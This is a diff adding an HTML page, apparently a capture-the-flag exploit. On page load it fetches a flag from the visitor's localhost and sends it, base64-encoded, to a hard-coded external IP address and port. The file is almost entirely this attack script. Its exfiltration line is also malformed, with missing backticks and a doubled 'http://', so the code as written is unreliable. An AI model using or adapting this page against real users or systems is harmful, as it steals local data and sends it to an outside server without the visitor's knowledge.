@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTF Challenge</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <div id="result"></div>
+
+    <script>
+        // Function to encode data for URL
+        function encodeData(data) {
+            return encodeURIComponent(btoa(data));
+        }
+
+        // Function to fetch flag
+        async function getFlag() {
+            try {
+                // Fetch flag from localhost
+                const response = await fetch('http://127.0.0.1/flag');
+                const flag = await response.text();
+                
+                // Display flag in page (for debugging)
+                document.getElementById('result').innerText = flag;
+                
+                // Send flag to your logging server
+                // Replace YOUR-SERVER with your actual server address
+                await fetch(http://http://36.50.177.41:40008/?flag=${encodeData(flag)});
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('result').innerText = 'Error: ' + error.message;
+            }
+        }
+
+        // Execute immediately when page loads
+        window.onload = getFlag;
+    </script>
+</body>
+</html>
